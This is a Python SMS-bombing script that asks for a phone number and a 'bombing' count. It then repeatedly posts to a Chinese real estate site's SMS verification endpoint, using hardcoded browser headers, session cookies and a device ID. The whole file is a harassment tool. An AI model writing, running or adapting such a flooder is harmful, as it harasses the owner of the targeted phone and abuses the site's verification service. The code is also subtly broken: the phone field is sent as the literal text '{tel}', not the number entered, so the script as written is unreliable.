import requests
import time
x = 0
print("""\033[0;34;40m
      _                 _                          
     | |               | |                         
     | |__   ___   ___ | | ___ __ ___   __ _ _ __  
     | '_ \ / _ \ / _ \| |/ / '_ ` _ \ / _` | '_ \ 
     | |_) | (_) | (_) |   <| | | | | | (_| | | | |
     |_.__/ \___/ \___/|_|\_\_| |_| |_|\__,_|_| |_|

""")
tel = input("输入电话号码:")
num = int(input("轰炸次数:"))
data1 = {'mobile': '{tel}','type': '1','deviceId': 'WHJMrwNw1k/G4XYz7Zf5VwQTFq6MY9kJuW8VCprGnbdU+bIHe8lnKNtAKcvdL/xBkvYh8q11Zsz1VsiuO8c1kgBUTBvvMEZ7OdCW1tldyDzmQI99+chXEioIl0lb0UxViF4FLg94PeU+vLMn6p3SpniHkvLSSe4GZIbtNikEBm645nqbECcowApFmlvWS/WAprjl+d2XxfVgh3MJ6BdlfhdCpI3Tsb+2f7xWD7mkTFhfVC1YkGmEVUmFLWtA20YVjjpbeDlb6VwRIExklGMVEHg==1487582755342'}
header1 = {
'Accept': 'application/json, text/javascript, */*; q=0.01'
,'Accept-Encoding': 'gzip, deflate, br'
,'Accept-Language': 'zh,en-GB;q=0.9,en;q=0.8'
,'Connection': 'keep-alive'
,'Content-Length': '367'
,'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
,'Cookie': 'historyCity=%5B%22%5Cu6210%5Cu90fd%22%5D; _ga=GA1.2.359150884.1673617886; _gid=GA1.2.709880235.1673617886; gr_user_id=ebd85f7d-9acf-4c34-8824-b6db0ad32337; smidV2=20230113215126e9bf688c206896b18f5e1f5bb443d2bb0070b48e0250a2f60; PHPSESSID=nvjjcm2g1v4gn75n9ss5ttbkla; domain=cd; HMF_CI=d3e48c0796fa5c3b2f1700dfaf9dcb8bdebdf07e05e5dffd5ea92999220c1562885d18d78d21d36f78f7d49a298e8736541df7e94338f7a6ade5831b02ae04bb33; HMY_JC=febe874eca65c2ead69ea846f47ab13911fb5133e65b8679d14108401a2fa8e256,; _gat=1; 8fcfcf2bd7c58141_gr_session_id=3fc6dbe0-2f08-4326-abbd-9ee0dcbdde8c; 8fcfcf2bd7c58141_gr_session_id_3fc6dbe0-2f08-4326-abbd-9ee0dcbdde8c=true; Hm_lvt_94ed3d23572054a86ed341d64b267ec6=1673617887,1673702406; Hm_lpvt_94ed3d23572054a86ed341d64b267ec6=1673702406'
,'DNT': '1'
,'Host': 'cd.5i5j.com'
,'Origin': 'https://cd.5i5j.com'
,'Referer': 'https://cd.5i5j.com/'
,'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"'
,'sec-ch-ua-mobile': '?0'
,'sec-ch-ua-platform': '"Windows"'
,'Sec-Fetch-Dest': 'empty'
,'Sec-Fetch-Mode': 'cors'
,'Sec-Fetch-Site': 'same-origin'
,'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.76'
,'X-Requested-With': 'XMLHttpRequest'}
while(x < num):
    v = requests.post(url="https://cd.5i5j.com/regloginnew/ajaxphonecodenew",data=data1,headers=header1)
    print(v.status_code)
    x += 1
    time.sleep(2)